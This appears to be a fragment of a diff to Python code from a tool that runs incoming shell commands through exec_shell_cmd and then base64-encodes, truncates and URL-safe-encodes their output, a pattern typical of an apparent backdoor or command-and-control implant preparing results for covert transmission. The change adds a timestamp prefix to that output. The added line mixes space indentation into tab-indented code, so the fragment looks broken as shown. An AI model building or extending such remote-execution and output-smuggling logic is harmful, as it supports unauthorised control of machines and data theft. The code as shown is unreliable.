@@ -131,7 +131,8 @@ def core():
 			if 'echo' in line:
 			
 				raw = exec_shell_cmd(line)
-				raw_str = str(raw)
+				tstamp = get_time_stamp()
+                                raw_str = '[!] ' + tstamp + '\n' + str(raw)
  				b64stdout = b64encstr(raw_str)
 				b64chomped = b64stdout[:65000]
 				cb64encstdout = custom_b64_urlsafe_enc(b64chomped)
